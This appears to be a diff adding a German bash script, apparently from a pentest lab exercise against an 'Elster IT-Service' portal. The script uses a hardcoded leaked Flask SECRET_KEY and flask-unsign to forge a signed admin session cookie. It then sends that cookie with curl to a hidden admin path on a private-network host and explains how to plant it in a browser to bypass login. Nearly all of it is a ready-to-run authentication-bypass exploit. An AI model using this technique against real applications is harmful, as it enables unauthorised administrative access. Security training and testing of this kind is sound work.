@@ -1,0 +1,35 @@
+#!/usr/bin/env bash
+# Cookie-Forgery fuer Elster IT-Service, Luecke 5+6
+# Zeigt: der geleakte SECRET_KEY allein reicht fuer Admin-Zugriff,
+# ganz ohne SQLi und ohne echten Login.
+#
+# Vorbereitung auf Kali (einmalig):
+#   pip install flask-unsign --break-system-packages
+#
+# Nutzung: dieses Skript 1:1 auf Kali kopieren und ausfuehren.
+# Keine Zeile manuell im Terminal abtippen -- genau das hat letztes
+# Mal zu den Tippfehlern (Leerzeichen im Dict-Key, Leerzeichen um "=")
+# gefuehrt.
+
+set -euo pipefail
+
+SECRET='ElsterPortal_2024_SuperSecret!'
+TARGET='http://192.168.10.20:8081'
+
+COOKIE_DICT="{'logged_in': True, 'user_id': 1, 'username': 'admin', 'role': 'admin', 'full_name': 'Admin'}"
+
+echo "[*] Signiere gefaelschtes Admin-Cookie mit geleaktem SECRET_KEY..."
+SIGNED=$(flask-unsign --sign --cookie "$COOKIE_DICT" --secret "$SECRET")
+
+echo "[*] Erzeugtes Cookie:"
+echo "    $SIGNED"
+echo
+
+echo "[*] Teste es direkt per curl gegen den Admin-Bereich (ohne Login!):"
+curl -s -i --cookie "session=$SIGNED" "$TARGET/portal-mgmt-77x" | head -20
+
+echo
+echo "[*] Fuer den Browser: Dev-Tools -> Application/Storage -> Cookies"
+echo "    Name:  session"
+echo "    Wert:  $SIGNED"
+echo "    Dann $TARGET/portal-mgmt-77x neu laden."
